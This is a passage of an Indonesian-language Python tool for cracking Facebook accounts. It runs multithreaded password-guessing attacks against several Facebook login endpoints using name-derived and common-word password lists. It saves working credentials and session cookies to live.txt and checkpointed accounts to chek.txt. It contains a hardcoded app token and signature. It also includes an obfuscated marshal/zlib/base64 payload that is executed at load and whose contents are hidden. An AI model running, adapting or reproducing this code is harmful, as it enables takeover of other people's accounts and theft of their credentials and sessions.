			if len(tOd)==0 or "|" not in tOd:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Chek")
			else:
				print("\n\x1b[1;33m[Result Check]\n")
				print(tOd)
			exit()
		elif pilih in["r","R"]:
			print("[*] Silahkan Hubungi WhatsApp Saya 083805812588");os.system("xdg-open http://wa.me/+6283805812588?text=assalamualaikum");input("[*] Enter Untuk Kembali Ke Menu > ");waktu(2);self.menu()
		elif pilih in["u","U"]:
			os.system("git pull")
			exit()
		elif pilih in["h","H"]:
			try:os.remove("cookie")
			except:os.system("rm cookie")
			exit()
		elif pilih in["i","I"]:
			about().tentang_sc()
			self.menu()
		elif pilih in["b","B"]:
			self.menu()
		elif pilih in["k","K"]:
			exit("[*] Thank You For Using My Tool")
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");self.fuck()
		else:
			print("[!] Pilihan Tidak Ada");self.fuck()
	def askk(self):
		njir=input("[?] Ingin Menggunakan Password Manual Y/T : ")
		if njir in(""," "):
			print("[!] Jangan Kosong Bro");self.askk()
		elif njir in("y","Y"):
			print("[*] Contoh : name123,name12345")
			while True:
				pwek=input("[?] Password : ")
				if pwek in(""," "):
					print("[!] Jangan Kosong Bro")
				elif len(pwek)<=5:
					print("[!] Password Minimal 6 Karakter")
				else:
					def xhh(xss=None):
						pilih=input("[?] Pilih : ")
						if pilih in(""," "):
							print("[!] Jangan Kosong Bro");xhh()
						elif pilih in("1","01"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.crackapi,xi,xss)
									except: pass
							hasil(live,chek)
						elif pilih in("2","02"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://mbasic.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("3","03"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://m.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("4","04"):
							print("[!] Harap Untuk Tidak Menggunakan Vpn/wifi Ketika Menggunakan Metode Ini\n[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://free.facebook.com")
									except: pass
							hasil(live,chek)
						else:
							print("[!] Isi Yang Bener Ajg");xhh()
					print("    [ Pilih Metode Crack ]")
					print("[1] Metode b-api (Mode Crack Cepat)")
					print("[2] Metode mbasic (Mode Crack Lambat)")
					#print("[3] Metode m.facebook (Mode Crack Lambat)")
					#print("[4] Metode free.facebook (Mode Crack Lambat)")
					xhh(pwek.split(","))
					break
		elif njir in("t","T"):
			print("    [ Pilih Metode Crack ]")
			print("[1] Metode b-api (Mode Crack Cepat)")
			print("[2] Metode mbasic (Mode Crack Lambat)")
			#print("[3] Metode m.facebook (Mode Crack Lambat)")
			#print("[4] Metode free.facebook (Mode Crack Lambat)")
			self.ngontol()
		else:
			print("[!] Isi Yang Bener Ajg");self.askk()
	def crackapi(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("live.txt","r").read() or user in open("chek.txt","r").read():
				break
			else:
				ses=req.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param)
				if "session_key" in send.text and "EAAA" in send.text:
					ok+=1
					print(f"\r\x1b[1;32m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("live.txt","a").write(f"{user}|{pw}\n")
					live.append(f"{user}{pw}")
					break
				elif "www.facebook.com" in send.json()["error_msg"]:
					cp+=1
					print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("chek.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def modol(self,user,ox,beol,**kwargs):
		global ok,cp,cot
		for pw in ox:
			if user in open("live.txt","r").read() or user in open("chek.txt","r").read():
				break
			else:
				ses=req.Session()
				a=ses.get(f"{beol}/login/?next&ref=dbl&refid=8").text
				b=parser(a,"html.parser")
				for x in b.find_all("input"):
					if x.get("name")==None or "_fb_noscript" in x.get("name") or "sign_up" in x.get("name"):
						continue
					else:
						kwargs.update({x.get("name"):x.get("value")})
				kwargs.update({"email":user,"pass":pw})
				tol=beol+b.find("form",method="post").get("action")
				if "m.facebook.com" in beol:
					ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"x-fb-lsd":kwargs.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":uag,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","origin":beol,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
				else:
					if "mbasic.facebook.com" in beol:
						anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
					else:
						anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
					ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":anjg,"origin":beol,"user-agent":uag,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				ses.post(tol,data=kwargs,allow_redirects=False)
				if "c_user" in ses.cookies.get_dict().keys():
					ok+=1
					kuki=";".join([f"{key}={value}" for key,value in ses.cookies.get_dict().items()])
					print(f"\r\x1b[1;32m * ---> {user}|{pw}|{kuki}\x1b[0m\n",end="")
					open("live.txt","a").write(f"{user}|{pw}|{kuki}\n")
					live.append(f"{user}{pw}{kuki}")
					break
				elif "checkpoint" in ses.cookies.get_dict().keys():
					cp+=1
					print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("chek.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def ngontol(self):
		nanya=input("[?] Pilih : ")
		if nanya in[""," "]:
			print("[!] Jangan Kosong Bro");self.ngontol()
		elif nanya in["1","01"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing"]
						tokai.submit(self.crackapi,xi[0],pewe)
					except:pass
			hasil(live,chek)
		elif nanya in["2","02"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing","freefire"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"1234",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing","freefire"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing","freefire"]
						tokai.submit(self.modol,xi[0],pewe,"https://mbasic.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in["3","03"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing"]
						tokai.submit(self.modol,xi[0],pewe,"https://m.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in["4","04"]:
			print("[!] Harap Untuk Tidak Menggunakan Vpn/wifi Ketika Menggunakan Metode Ini\n[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing"]
						tokai.submit(self.modol,xi[0],pewe,"https://free.facebook.com")
					except:pass
			hasil(live,chek)
		else:
			print("[!] Isi Yang Bener Ajg");self.ngontol()
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'obf.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
if __name__=="__main__":
	try:
		kueh=zxss(open("cookie","r").read().strip())
	except FileNotFoundError:
		os.system("clear")
		print("\n[*] Cara Mendapatkan Cookie : https://youtu.be/ZT4MU7AlgA4\n[*] Ketik OPEN Untuk Membuka Video\n")
		while True:
			a=input("[?] Masukkan Cookie : ")
			if a in[""," "]:
				print("[!] Jangan Kosong")
			elif a in["open","OPEN","Open"]:
				import subprocess
				exit(subprocess.Popen(["am","start","https://youtu.be/ZT4MU7AlgA4"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
			else:
				asup(a).login()
	try:
		tentang=json.loads(open("my_info","r").read().strip())
	except FileNotFoundError:
		from informasi import info as aapganteng_
		aapganteng_(kueh).myinfo();restart()
	if os.path.exists("chek.txt"): pass
	else: open("chek.txt","a").close()
	if os.path.exists("live.txt"): pass
	else: open("live.txt","a").close()
	ngentod().menu()


"""
Create By Aap Afandi Ganteng
GITHUB : https://github.com/KangPacman
"""